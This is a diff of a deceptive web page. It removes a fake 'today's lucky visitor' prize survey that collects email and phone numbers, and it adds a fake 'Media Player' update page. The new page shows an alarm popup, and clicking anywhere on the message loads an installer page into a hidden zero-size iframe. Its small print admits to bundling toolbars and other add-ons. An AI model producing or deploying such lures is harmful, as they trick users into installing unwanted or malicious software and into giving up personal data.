@@ -1,34 +1,148 @@
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-	<head>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-		<title>Survey 2013</title>
-		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
-		<link href="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/css/style.css" rel="stylesheet" type="text/css" />
-					<link href="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/css/../../../../_common/logos/css/qr/style2.css" rel="stylesheet" type="text/css" />
-				<script src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/js/script.js"></script>
-		<!--[if IE]>
-			<style>
-				.prize_box {
-		    		border: none;
-					background:url(http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/large_box.gif) no-repeat;
-				}
-			</style>
-		<![endif]-->		
-		<script type="text/javascript">
-			
-			$(document).ready(function (){
-				initForm('','','');
-				initStock('');
-				initPage();
-			});
-		</script>
-	
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-<script src='http://static.popular-prizes.prize-savingsonline.info/templates/_common/js/date/returnDate.en.js'></script>
+
+
+<title>Update</title>
+
+<style type="text/css">
+div#container
+{
+   width: 602px;
+   position: relative;
+   margin-top: 0px;
+   margin-left: auto;
+   margin-right: auto;
+   text-align: left;
+}
+body
+{
+   text-align: center;
+   margin: 0;
+   background-color: #4C4C4C;
+   color: #000000;
+}
+
+.fp_msg_container{
+	background: url(http://static.popular-prizes.prize-savingsonline.info/templates/video.mini/mediaplayer_update/images/flash_bg.jpg) no-repeat;
+	width: 552px;
+	font-family: "Arial";
+	font-weight: light;
+	color: #FFF;
+	font-size: 12px;
+	text-shadow: 0px 1px 0px #000;	
+	margin: 0px auto;
+	cursor: pointer;
+	display: block;
+}
+
+
+.fp_msg{
+	height: 251px;
+	padding-left: 120px;
+	position: relative;
+
+}
+
+.fp_version{
+	position: absolute;
+	bottom: 10px;
+	right: 10px;
+	font-size: 9px;
+	
+}
+
+.fp_msg a{
+	color: #9ccfff;
+}
+
+
+.fl_list{
+	padding: 0px;
+}
+
+.fl_list li{
+	padding: 5px 0px;
+}
+
+.fp_header{
+	color: #DDD;
+	font-size: 16px;
+	padding-top: 20px;
+	text-shadow: 2px 2px 3px #444;
+}
+
+.important{
+	color: red;
+	font-size: 13px;
+}
+.left{
+	float: left;
+}
+.right{
+	float: right;
+}
+.clear{
+	clear: both;
+}
+
+.fp_msg_btns{
+	padding: 20px 20px;
+	text-transform: uppercase;
+}
+
+
+.btn {
+    background: url("http://static.popular-prizes.prize-savingsonline.info/templates/video.mini/mediaplayer_update/images/btn_fl_left.gif") no-repeat left top;
+    cursor: pointer;
+    padding: 0 0 0 3px;
+    text-decoration: none;
+    
+    /* cross-browser inline-block */
+    display: -moz-inline-stack; /* Firefox 2 */
+	display: inline-block;
+    zoom: 1;  /* IE hack to trigger hasLayout */
+	*display: inline;  /*  IE hack to achieve inline-block behavior */
+	
+    /* disable text-selection */
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -o-user-select: none;
+    user-select: none;
+}
+.btn span{
+    background: url("http://static.popular-prizes.prize-savingsonline.info/templates/video.mini/mediaplayer_update/images/btn_fl.gif") no-repeat right top;
+    color: #FFFFFF;
+    font-family:Helvetica, Arial, sans-serif;
+    height: 31px;
+    line-height: 31px;
+    padding: 0px 31px 0px 28px;
+    text-align: center;
+
+	 /* cross-browser inline-block */
+    display: -moz-inline-stack; /* Firefox 2 */
+	display: inline-block;
+    zoom: 1;  /* IE hack to trigger hasLayout */
+	*display: inline;  /*  IE hack to achieve inline-block behavior */
+}
+
+#wb_Text5 span a{
+	color: #FFF;
+}
+
+.fp_header span{
+	color: red;
+	font-size: 13px;
+}
+
+</style>
+
 <!-- STARTALERT -->
 <script type="text/javascript">
-alert("************************************************\n\nCongratulations!\n\nYou are Todays Lucky Visitor.\n\nClick OK to continue\n\n************************************************");	
+alert("WARNING! You should update your Media Player Immediately");	
 </script>
 <!-- ENDALERT -->
 <meta name="robots" content="noindex, nofollow" />
@@ -36,255 +150,57 @@ alert("************************************************\n\nCongratulations!\n\nY
 <body>
 
 
-<div class="container1">
-	<div class="sidebar"><div class="sb1"></div><div class="sb2"></div></div>
-	<div class="container2">
-		<div class="container3">
-					<div class="header">
-						<div class="wrapper">
-							<!-- LOGO START -->
-															<div class="logo left"><img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/../images/../../../_common/logos/logo_qr-code.gif"/></div>	
-														<!-- LOGO END -->
-							<div class="clear"></div>
-							<div class="jdate right"><script type="text/javascript">{returnDate("full",1)}</script></div>
-							<div class="clear"></div>
-						</div>
-					</div>
-					<div class="content_container">	
-						<div class="wrapper">
-							<div class="wp">
-								<div class="wp fade"></div>
-								<div class="survey_text">
-									<div class="start_page_left left">
-										<h1>
-											Congratulations										</h1>
-										<p>	
-											You are today’s 100,000th visitor!<br/>
-											Complete this 30 second survey and claim your reward!
-										</p>
-										<div class="link">
-											<div class="btn rollover start_link"><span>Start Now! &rsaquo;</span></div>
-										</div>
-									</div>
-									<div class="start_page_right left">
-										<div class="start_image">
-											<div class="start_page_image">
-												<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/blue_survey/images/walmart-apple-samsung.png"/>
-											</div>
-											<div class="start_page_reward_list">
-												Today's Rewards include:<br/>
-												an <strong>iPhone 5C</strong><sup></sup>, a <strong>$1000 Walmart Card</strong><sup></sup>, or a <strong>Galaxy S4</strong><sup></sup>											</div>
-										</div>	
-									</div>
-									<div class="clear"></div>
-								</div>
-								<div class="questions">
-									<div id="question1" class="question">
-										<h1 class="question_number">Question 1 of 3</h1>
-										<div class="question_text">
-											Are you male or female?
-											<div class="answers">
-												<ul class="answer_list">
-													<li onclick="collectAnswer('gender','M');nextQuestion(2);"><a>Male</a></li>
-													<li onclick="collectAnswer('gender','F');nextQuestion(2);"><a>Female</a></li>
-												</ul>
-											</div>
-										</div>
-									</div><!-- question -->
-						
-																			<div id="question2" class="question">
-										<h1 class="question_number">Question 2 of 3</h1>
-										<div class="question_text">
-											Where are you viewing this from?
-											<div class="answers">
-												<ul class="answer_list">
-													<li onclick="nextQuestion(3);"><a>Home</a></li>
-													<li onclick="nextQuestion(3);"><a>Work</a></li>
-													<li onclick="nextQuestion(3);"><a>School</a></li>
-													<li onclick="nextQuestion(3);"><a>Other</a></a></li>
-												</ul>
-											</div>
-										</div>
-									</div><!-- question -->
-									
-									
-									<div id="question3" class="question">
-										<h1 class="question_number">Question 3 of 3</h1>
-										<div class="question_text">
-											How many hours do you spend online daily?
-											<div class="answers">
-												<ul class="answer_list">
-													<li onclick="nextQuestion(4,'loader');"><a><1</a></li>
-													<li onclick="nextQuestion(4,'loader');"><a>1-2</a></li>
-													<li onclick="nextQuestion(4,'loader');"><a>2-3</a></li>
-													<li onclick="nextQuestion(4,'loader');"><a>3+</a></li>
-												</ul>
-											</div>
-										</div>
-									</div><!-- question -->
-									
-															
-									<div id="question4" class="question">
-										<div class="loader">
-											<p>Submitting Responses...</p>
-											<div class="loader_bar"></div>
-										</div>	
-									</div><!-- question -->
-						
-									<div id="question5" class="question">
-										<div class="prize_text">
-											<strong>Thank you for your input. Select a product below for your chance to win.</strong>
-										</div><br/>
-										<div class="prize_boxes clearfix">
-											<div class="prize_box prize1">
-												<div class="prize">
-													<div class="stock_box">Out of Stock</div>
-													<h1 class="prize_title">iPhone 5C</h1>
-													<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/prize_iphone5c.jpg"/>
-													<p>Quantity Remaining <span class="quantity">3</span></p>
-												</div>
-												<div class="prize_select">
-													<div class="btn rollover" onclick="nextQuestion(6);selectPrize('prize1', 'iPhone 5C', 'FLUiphone4cUS.html' , '', 'iphone5c');"><span>Select &rsaquo;</span></div>
-												</div>
-											</div>
-											<div class="prize_box prize2 middle">
-												<div class="prize">
-													<div class="stock_box">Out of Stock</div>					
-													<h1 class="prize_title">$1000 Walmart Card</h1>
-													<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/prize_walmart1000.jpg"/>
-													<p>Quantity Remaining <span class="quantity">4</span></p>
-												</div>
-												<div class="prize_select">
-												<div class="btn rollover" onclick="nextQuestion(6);selectPrize('prize2', '$1000 Walmart Card', 'FLU477walmartUS.html', '', 'walmart1000');"><span>Select &rsaquo;</span></div>
-												</div>
-											</div>
-											<div class="prize_box prize3">
-												<div class="prize">
-													<div class="stock_box">Out of Stock</div>							
-													<h1 class="prize_title">Galaxy S4</h1>
-													<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/prize_galaxys4.jpg"/>
-													<p>Quantity Remaining <span class="quantity">2</span></p>
-												</div>
-												<div class="prize_select">
-													<div class="btn rollover" onclick="nextQuestion(6); selectPrize('prize3', 'Galaxy S4', 'FLU1765S4US.html', '', 'galaxys4');"><span>Select &rsaquo;</span></div>
-												</div>
-											</div>
-										</div>
-									</div><!-- question -->
-									<div id="question6" class="question">
-										<div class="prize_flippy" id="prize1" style="margin-top: 91px;">
-											<p style="line-height:30px;">You selected the <span>iPhone 5C<sup>®</sup></span></p>
-											<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/iphone5c2.png">
-										</div>
-										<div class="prize_flippy" id="prize2" style="margin-top: 64.5px;">
-											<p style="line-height:30px;">You selected the <span>$1000 Walmart Card<sup>®</sup></span></p>
-											<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/walmart10002.png">
-										</div>
-										<div class="prize_flippy" id="prize3" style="margin-top: 53.5px;">
-											<p style="line-height:30px;">You selected the <span>Galaxy S4<sup>®</sup></span></p>
-											<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/galaxys42.png">
-										</div>
-										<div id="form_details">
-											<div class="form_text">
-												<strong>Thank you for your response.</strong><br/>
-												Please enter your information to continue. Participation is required.						
-											</div>
-											<div class="form_title">
-												Please enter your information to continue
-											</div>
-											<div class="form">
-												<form id="form1" action="go.html" method="post">
-													<table width="425" cellpadding="2" cellspacing="2" id="shipping_table">
-														<tr id="form_email">
-															<td class="label">Email:</td>
-															<td colspan="3" align="left" valign="middle">
-																<input class="email input" type="text" name='email' id='email'>
-															</td>
-														</tr>
-														<tr id="form_cell">
-															<td class="label">Cell Phone:</td>
-															<td align="left" valign="middle" >
-																<input class="mobile input" name='cell1' id='cell1' maxlength="3" type="text" onkeypress="return numbersonly(this, event)" onKeyUp="moveFocus(this,'cell2')"/>
-															</td>
-															<td align="left" valign="middle" >
-																<input class="mobile input" name='cell2' id='cell2' maxlength="3" type="text" onkeypress="return numbersonly(this, event)" onKeyUp="moveFocus(this,'cell3')"/>
-																</td>
-															<td align="left" valign="middle"  > 
-																<input class="mobile input" name='cell3' id='cell3' maxlength="4" type="text" onkeypress="return numbersonly(this, event)" />
-															</td>
-														</tr>
-														<tr>
-															<td>&nbsp;</td>
-															<td colspan="3" class="submit" align="left" valign="middle">
-															<div class="btn rollover" style="width: 175px;" onclick="final_validate(); return false;"><span>Validate &rsaquo;</span></div>
-															</td>
-														</tr>
-													</table>
-												</form>
-											</div>
-										</div><!-- form_details -->
-										<div id="form_loader">
-											<div class="form_loader">
-												Checking availibility...<br/>
-											</div>
-											<div class="form">
-												<div class="loader_bar"></div>
-											</div>
-										</div><!-- form_details -->
-						
-									</div><!-- question -->
-								</div><!-- questions -->
-							</div><!--wp-->
-						</div><!--wrapper-->
-						<div class="footer" id='footer'>
-							<div class="wrapper">
-								<p>
-								<a href="terms/privacy.html" target="_blank" id='privacy'>Privacy</a>&nbsp;&nbsp;&nbsp;
-								<a href="terms/terms.html" target="_blank" id='terms'>Terms</a>&nbsp;&nbsp;&nbsp;
-								<a href="terms/aboutus.html" target="_blank" id='aboutus'>About Us</a></p>
-								<p>&copy; 2013 All rights reserved</p>
-							</div>
-						</div>
-					</div><!-- content_container -->
-				</div><!-- container3 -->	
-			</div><!-- container2 -->
-			<div class="clear"></div><!-- clear container2 float-->				
-			
-			<div class="sticky_footer">
-				<div class="footer2">
-					<ul>           
-						<li>&copy; 2013&nbsp;All rights reserved. - </li>
-						<li><a target="_blank" href="terms/privacy.html">Privacy</a></li>
-						<li><a target="_blank" href="terms/terms.html">Terms</a></li>
-						<li><a target="_blank" href="terms/aboutus.html">About Us</a></li>
-						<li class="footer_language"><a>English (US)</a></li>
-						<li class="footer_language"><a>Français (Canada)</a></li>
-						<li class="footer_language"><a>Español</a></li>
-						<li class="footer_language"><a>Português(Brasil)</a></li>
-						<li class="footer_language"><a>Français(France)</a></li>
-					</ul>
-					</div>
-					<div class="bb_wrap">
-					<div class="bb_content">complete 30 second survey and receive prize
-						<span class="uparrow"></span>
-					</div>
-				</div>
-			</div>
-		</div><!-- container1 -->	
-		
-	
-		
-			<div id="img_preload" style="position: absolute; overflow: hidden; height: 0px;">
-				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/macbook2.jpg"/>
-				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/iphone2.jpg"/>
-				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/ipad2.jpg"/>
-				<div class="loader_bar"></div>
-				<!--[if IE]>
-				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/large_box.gif"/>
-				<![endif]-->
-			</div>
-			
-	
+	<iframe name="direct_download" id="direct_download" style="height: 0px; width: 0px; position: absolute; left: 0px; top: 0px;"></iframe>
+  <div id="container">
+  	<div class="fp_msg_container" onclick="direct_download.location='AIRmediaplayerupdatenew1US.html'">
+  
+	  	<div class="fp_msg">
+	  		<div class="fp_header">
+	  			 Upgrade your Media Player now <span>(Recommended)</span> 	  		</div>
+	  		<ul class="fl_list">
+	  			<li>Superior HD video performance with hardware acceleration of video</li>
+	  			<li>Support for full screen mode with multiple monitors</li>
+	  			<li>Faster graphics rendering support with Internet Explorer 9</li>
+	  			<li>Bug fixes and security enhancements</li>
+	  		</ul>
+	  		<a href="AIRmediaplayerupdatenew1US.html" target="direct_download">See details<br/>
+	  		End User License Agreement
+	  		</a>
+	  		<div>
+	  		Updating takes under a minute on broadband - no restart required.
+	  		</div>
+	  		<div class="fp_version">
+	  			ver. 12.0
+	  		</div>
+	  	</div>
+	  	<div class="fp_msg_btns">
+	  		<div class="left">
+	  			<div class="btn"><span>Remind Me Later</span></div>
+	  		</div>
+	  		<div class="right">
+	  			<div class="btn"><span>Install ›</span></div>
+	  		</div>
+	  		<div class="clear"></div>
+	  	</div>
+  	</div>
+  	
+    <div id="wb_Text4" style=
+    "position:absolute;left:20px;top:456px;width:576px;height:144px;z-index:1;text-align:left;">
+    <span style="color:#222;font-family:Arial;font-size:13px;"><span style="text-transform: capitalize">mini</span>is distributing custom installers which are different from the originally available distribution. These new installers comply with the original software manufacturers’ policies and terms & conditions. These installers are install managers, which manages the installation of your chosen software. In addition to managing your download and installation, they will offer free popular software that you may be interested in. Additional software may include toolbars, browser add-ons, game applications, anti-virus applications, and other types of applications. You are not required to install any additional software to complete your installation of your selected software. You can always completely remove the programs at any time in Windows’ Add/Remove Programs.</span>
+    </div>
 
-</body>
-</html><!-- Mini 1386703581 -->
+    <div id="wb_Text5" style=
+    "position:absolute;left:114px;top:429px;width:405px;height:16px;z-index:2;text-align:left;">
+    <span style="color:#FFFFFF;font-family:Arial;font-size:13px;"><a href=
+    "privacy.php" target="_blank" class="white">Privacy Policy</a> &middot;
+      <a href="terms.php" target="_blank" class="white">Terms &amp; Conditions</a>
+      &middot; <a href="uninstall.php" target="_blank" class=
+      "white">Uninstall</a></span><span style=
+      "color:#000000;font-family:Arial;font-size:13px;">&nbsp; <a href="contact.php"
+      target="_blank" class="white">Contact Us</a></span>
+    </div>
+  </div>
+</html>
+
+
+<!-- Mini 1386705344 -->
